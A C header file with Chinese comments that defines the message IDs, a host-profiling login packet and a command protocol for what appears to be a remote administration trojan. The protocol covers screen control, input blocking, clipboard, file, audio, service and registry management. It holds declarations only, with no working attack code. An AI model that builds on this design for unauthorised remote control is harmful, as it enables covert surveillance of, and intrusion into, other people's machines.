#pragma once

#define  REGISTER_MANAGER_DIALOG 0x17
#define  SERVICE_MANAGER_DIALOG  0x16
#define  VIDEO_MANAGER_DIALOG    0x15
#define  AUDIO_MANAGER_DIALOG    0x14
#define  FILE_MANAGER_DIALOG     0x13
#define  REMOTE_CONTROL_DIALOG   0x12
#define  WINDOW_MANAGER_DIALOG   0x11
#define  PROCESS_MANAGER_DIALOG  0x10
#define  CMD_MANAGER_DIALOG      0x9
#define  UM_CLIENT_LOGIN   WM_USER+1000
#define  UM_OPEN_REMOTE_MESSAGE_DIALOG  WM_USER+1005
#define  UM_OPEN_CMD_MANAGER_DIALOG     WM_USER + 1006
#define  UM_OPEN_PROCESS_MANAGER_DIALOG  WM_USER+1007
#define  UM_OPEN_WINDOW_MANAGER_DIALOG   WM_USER+1008
#define  UM_OPEN_REMOTE_CONTROL_DIALOG   WM_USER+1009
#define  UM_OPEN_FILE_MANAGER_DIALOG     WM_USER+1010
#define  UM_OPEN_AUDIO_MANAGER_DIALOG    WM_USER+1011
#define  UM_OPEN_VIDEO_MANAGER_DIALOG    WM_USER+1012
#define  UM_OPEN_SERVICE_MANAGER_DIALOG   WM_USER+1013
#define  UM_OPEN_REGISTER_MANAGER_DIALOG  WM_USER + 1014

#pragma pack(1)
typedef  struct  _LOGIN_INFORMATION_
{
	BYTE   IsToken;                                       //信息头部
	OSVERSIONINFOEX    OsVersionInfoEx;                  //版本信息
	char      ProcessorNameString[MAX_PATH];             //CPU主频
	IN_ADDR          ClientAddress;                      //存储32位的IPv4的地址的数据结构
	char             HostName[MAX_PATH];                 //主机名
	BOOL             IsWebCameraExist;                   //是否有摄像头
	DWORD            WebSpeed;                           //网速
}LOGIN_INFORMATION, *PLOGIN_INFORMATION;

#pragma pack(1)
typedef struct _PROCESS_ITEM_INFORMATION_
{
	HANDLE ProcessID;
	char   ProcessImageName[MAX_PATH];
	char   ProcessFullPath[MAX_PATH];
	char   IsWow64[20];
}PROCESS_ITEM_INFORMATION, *PPROCESS_ITEM_INFORMATION;


enum
{
	// 文件传输方式
	TRANSFER_MODE_NORMAL = 0x00,	// 一般,如果本地或者远程已经有，取消
	TRANSFER_MODE_ADDITION,			// 追加
	TRANSFER_MODE_ADDITION_ALL,		// 全部追加
	TRANSFER_MODE_OVERWRITE,		// 覆盖
	TRANSFER_MODE_OVERWRITE_ALL,	// 全部覆盖
	TRANSFER_MODE_JUMP,				// 覆盖
	TRANSFER_MODE_JUMP_ALL,			// 全部覆盖
	TRANSFER_MODE_CANCEL,			// 取消传送
};

enum
{
	CLIENT_LOGIN ,                      //上线包
	CLIENT_GET_OUT_REQUEST,              //	强制下线用户请求
	CLIENT_GET_OUT_REPLY,                //强制下线用户回复
	CLIENT_REMOTE_MESSAGE_REQUEST,       //即时消息请求
	CLIENT_REMOTE_MESSAGE_REPLY,          //即时消息回复
	CLIENT_REMOTE_MESSAGE_COMPLETE,
	CLIENT_SHUT_DOWN_REQUEST,
	CLIENT_SHUT_DOWN_REPLY,

	CLIENT_CMD_MANAGER_REQUIRE,
	CLIENT_CMD_MANAGER_REPLY,

	CLIENT_PROCESS_MANAGER_REQUIRE,
	CLIENT_PROCESS_MANAGER_REPLY,
	CLIENT_PROCESS_REFRESH_REQUIRE,
	CLIENT_PROCESS_REFRESH_REPLY,
	CLIENT_PROCESS_TERMINATE_REQUIRE,
	CLIENT_PROCESS_THREAD_INFO_SHOW_REQUIRE,
	CLIENT_PROCESS_THREAD_INFO_SHOW_REPLY,
	CLIENT_PROCESS_HANDLE_INFO_SHOW_REQUIRE,
	CLIENT_PROCESS_HANDLE_INFO_SHOW_REPLY,
	CLIENT_WINDOW_MANAGER_REQUIRE,
	CLIENT_WINDOW_MANAGER_REPLY,
	CLIENT_WINDOW_REFRESH_REQUIRE,
	CLIENT_REMOTE_CONTROL_REQUIRE,
	CLIENT_REMOTE_CONTROL_REPLY,
	CLIENT_REMOTE_CONTROL_FIRST_SCREEN,
	CLIENT_REMOTE_CONTROL_NEXT_SCREEN,
	CLIENT_REMOTE_CONTROL_CONTROL_REQUIRE,
	CLIENT_REMOTE_CONTROL_BLOCK_INPUT,
	CLIENT_REMOTE_CONTROL_GET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROL_GET_CLIPBOARD_REPLY,
	CLIENT_REMOTE_CONTROL_SET_CLIPBOARD_REQUIRE,
	CLIENT_REMOTE_CONTROL_SET_CLIPBOARD_REPLY,
	CLIENT_FILE_MANAGER_REQUIRE,
	CLIENT_FILE_MANAGER_REPLY,
	CLIENT_FILE_MANAGER_FILE_DATA_REQUIRE,
	CLIENT_FILE_MANAGER_FILE_DATA_REPLY,
	CLIENT_FILE_MANAGER_DELETE_FILE_REQUEST, 
	CLIENT_FILE_MANAGER_NEW_FOLDER_REQUEST,
	CLIENT_FILE_MANAGER_FILE_INFORMATION_REQUEST,
	CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUEST,
	CLIENT_FILE_MANAGER_TRANSFER_MODE_REPLY,
	CLIENT_FILE_MANAGER_FILE_DATA,
	CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE,
	CLIENT_AUDIO_MANAGER_REQUIRE,
	CLIENT_AUDIO_MANAGER_REPLY,
	CLIENT_AUDIO_MANAGER_DATA,
	CLIENT_SERVICE_MANAGER_REQUIRE,
	CLIENT_SERVICE_MANAGER_REPLY,
	CLIENT_SERVICE_MANAGER_CONFIG_REQUIRE,
	CLIENT_REGISTER_MANAGER_REQUIRE,
	CLIENT_REGISTER_MANAGER_REPLY,
	CLIENT_REGISTER_MANAGER_DATA,
	CLIENT_REGISTER_MANAGER_PATH_DATA_REPLY,
	CLIENT_REGISTER_MANAGER_KEY_DATA_REPLY,
	CLIENT_GO_ON, 
};